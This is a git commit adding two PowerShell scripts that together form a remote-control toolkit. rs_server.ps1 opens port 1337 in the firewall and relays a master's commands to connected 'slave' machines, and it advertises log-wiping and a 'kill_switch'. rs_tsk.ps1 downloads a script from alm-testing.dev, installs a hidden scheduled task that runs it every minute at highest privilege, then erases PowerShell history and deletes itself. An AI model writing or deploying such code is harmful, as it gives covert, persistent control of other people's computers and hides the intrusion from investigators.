7a14681a3dbdc26b41de28e577c3ff40eb905a82
logan <loganmitchell2011@gmail.com>
2022-08-18 21:01:06 -0400

    moved everything up a level and got rid of unecessary directory.

---
+++ scripts/rs_server.ps1
@@ -0,0 +1,223 @@
+
+if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
+	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
+} 
+
+if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
+	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
+} 
+#$stream = $client.GetStream() 
+#$reader = New-Object System.IO.StreamReader($stream);
+#$writer = New-Object System.IO.StreamWriter($stream);
+
+$exit = 0;
+$enc = [system.Text.Encoding]::UTF8
+# Set up endpoint and start listening
+$clientIDTicker = 0;
+$endpoint = new-object System.Net.IPEndPoint([ipaddress]::any, 1337) 
+$server = new-object System.Net.Sockets.TcpListener $endpoint
+[pscustomobject[]]$ClientList = $null;
+[pscustomobject]$MasterClient = $null;
+
+Try { 	
+	Write-Output "Booting server...";
+	$server.Start();		
+}
+Catch {
+	Write-Output $_;
+}
+
+Write-Output "Waiting for clients...";
+while ($exit -eq 0) {
+	#Client Initialization.
+	if ($server.Pending()) {
+		$client = $server.AcceptTcpClient();	
+		$stream = $client.GetStream() 
+		$reader = New-Object System.IO.StreamReader($stream);
+		$writer = New-Object System.IO.StreamWriter($stream);		
+		if ($reader.Peek() -ge 0) {
+			$in_buff = $reader.ReadLine();
+			#Write-Output $in_buff;
+			$join_buff = $in_buff -join "";
+			if ($join_buff -eq "master_init") {
+				$MasterClient = [pscustomobject]@{
+								ID = $clientIDTicker
+								ClientConn = $client;
+								ClientRemoteIP = $client.Client.RemoteEndPoint.Address.IPAddressToString;
+
+							  }				
+				$writer.WriteLine("master established");
+				$writer.Flush();
+				Write-Output "Master Connected";
+			} else {
+				$ClientList += [pscustomobject]@{
+								ID = $clientIDTicker;
+								ClientConn = $client;
+								ClientRemoteIP = $client.Client.RemoteEndPoint.Address.IPAddressToString;
+
+							  }
+				$writer.WriteLine("slave established");
+				$writer.Flush();
+				Write-Output "slave Connected...";
+			}
+		}
+		$clientIDTicker += 1;
+	}
+	if ($ClientList -ne $null -and $ClientList.Length -gt 0) {
+		#Iterate over clients. Read content of messages and send results to master client.
+		for ($i=0; $i -lt $ClientList.Length; $i++) {			
+			try {
+				if($ClientList[$i].ClientConn.Client.Poll(500000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
+					if ($ClientList[$i].ClientConn.Client.Available -eq 0) {
+						Write-Output "Connection to client lost.";
+						$ClientList[$i].ClientConn.Close();					
+					} else {
+						$client_stream = $ClientList[$i].ClientConn.GetStream();
+						$client_reader = New-Object System.IO.StreamReader($client_stream);
+
+						if ($MasterClient -ne $null) {
+							$master_stream = $MasterClient.ClientConn.GetStream();
+							$master_writer = New-Object System.IO.StreamWriter($master_stream);
+							while ($client_reader.Peek() -ge 0) {
+								try {
+									$in_buff = $client_reader.ReadLine();
+									$join = $in_buff -join "";
+									$master_writer.WriteLine($join);
+									$master_writer.Flush();								
+								} catch {}
+							}
+
+						} else {
+							while ($client_reader.Peek() -ge 0) {
+								try {
+									$in_buff = $client_reader.ReadLine();
+									$join = $in_buff -join "";
+									Write-Output $join;						
+								} catch {}
+							}
+						}
+
+					}
+				}
+			} catch [ObjectDisposedException] {
+				$NewList = $null
+				foreach($item in $ClientList) {
+					if ($item.ClientConn -ne $ClientList[$i].ClientConn) {
+						$NewList += $item
+					}
+				}
+				$ClientList = $NewList;
+			}
+		}		
+	}
+
+	if ($MasterClient -ne $null) {
+		try {
+			if($MasterClient.ClientConn.Client.Poll(500000, [System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
+				if ($MasterClient.ClientConn.Client.Available -eq 0) {
+					Write-Output "Master Connection lost.";
+					$MasterClient.ClientConn.Close();
+				} else {
+						$master_stream = $MasterClient.ClientConn.GetStream();
+						$master_reader = New-Object System.IO.StreamReader($master_stream);
+						$master_writer = New-Object System.IO.StreamWriter($master_stream);
+					while ($master_reader.Peek() -ge 0) {
+						try {							
+							$in_buff = $master_reader.ReadLine();
+							$join = $in_buff -join "";							
+							#client_dump####################################################
+							if ($join -match ".*--client_dump") {
+								Write-Output "Dumping client list to master client.";
+								if ($ClientList.Length -gt 0) {
+									for ($i=0; $i -lt $ClientList.Length; $i++) {
+										try {
+											$master_writer.WriteLine("ID: "+$ClientList[$i].ID);
+											$master_writer.WriteLine("IP: "+$ClientList[$i].ClientRemoteIP);
+											$master_writer.WriteLine(" ");
+												
+										} catch {
+											Write-Output $_;
+										}
+										
+									}									
+								} else {
+									$master_writer.WriteLine("No clients connected");
+								}
+
+								$master_writer.Flush();
+
+
+							#Server Shutdown#################################################
+							} elseif ($join -match "--server_shutdown") {
+								for ($i=0; $i -lt $ClientList.Length; $i++) {
+									$ClientList[$i].ClientConn.Close();
+								}
+								$MasterClient.ClientConn.Close();
+								$server.Stop();
+								$exit =1;
+
+							#Send slave command##############################################
+							} elseif ($join -match ".*--[i|I][d|D]=([0-9]+|[B][C])\s+--command=(.*)") {
+								
+								if ($Matches[1] -eq "BC") {
+									for ($i=0; $i -lt $ClientList.Length; $i++) {
+										$client_stream = $ClientList[$i].ClientConn.GetStream();
+										$client_writer = New-Object System.IO.StreamWriter($client_stream)
+										$client_writer.WriteLine($Matches[2]);
+										$client_writer.Flush();
+									}
+								} else {								
+									for ($i=0; $i -lt $ClientList.Length; $i++) {
+										if ($Matches[1] -eq $ClientList[$i].ID) {
+											$client_stream = $ClientList[$i].ClientConn.GetStream();
+											$client_writer = New-Object System.IO.StreamWriter($client_stream)
+											$client_writer.WriteLine($Matches[2]);
+											$client_writer.Flush();
+											break;
+										}
+										if ($Matches[1] -ne $ClientList[$i].ID -and $i -eq $ClientList.Length -1) {
+											$client_stream = $ClientList[$i].ClientConn.GetStream();
+											$client_writer = New-Object System.IO.StreamWriter($client_stream)
+											$client_writer.WriteLine("Slave ID not found");
+											$client_writer.Flush();
+										}
+									}								
+								}
+							} else {
+								#Dump accepted command list.
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("improper format detected:");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#Command")
+								$master_writer.WriteLine("--id=<int> --command=<string>");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#ClientList")
+								$master_writer.WriteLine("--client_dump");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#WipeLogs");
+								$master_writer.WriteLine("--log_wipe");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#TempShutdown");
+								$master_writer.WriteLine("--client_shutdown");
+								$master_writer.WriteLine(" ")
+								$master_writer.WriteLine("#Use with caution!!!")
+								$master_writer.WriteLine("#Dismantles endpoint client forever and wipes client event history.")
+								$master_writer.WriteLine("--kill_switch");
+								$master_writer.WriteLine(" ")
+								$master_writer.WriteLine(" ")
+								$master_writer.Flush();
+							}
+							#################################################################
+						} catch{
+							Write-Output $_;
+						}
+					}
+				}
+			}
+		} catch [ObjectDisposedException] {
+			Write-Output "disposed exception thrown on master connection.";
+			$MasterClient = $null;
+		}		
+	}	
+}
---
+++ scripts/rs_tsk.ps1
@@ -0,0 +1,20 @@
+$dotext = ".ps1"
+$extfile = "powershell"
+C:\Windows\system32\cmd.exe /c assoc $dotext=$extfile
+C:\Windows\system32\cmd.exe /c "ftype $extfile=""C:\Windows\System32\powershell.exe"" ""%1"""
+
+$client = New-Object System.Net.WebClient
+$client.DownloadFile('http://alm-testing.dev/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')
+
+$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
+if($taskExists) {
+   Write-Output "EXISTS";
+} else {
+   Write-Output "Creating task...";
+   C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
+}
+
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+Remove-Item $script:MyInvocation.MyCommand.Path -Force;
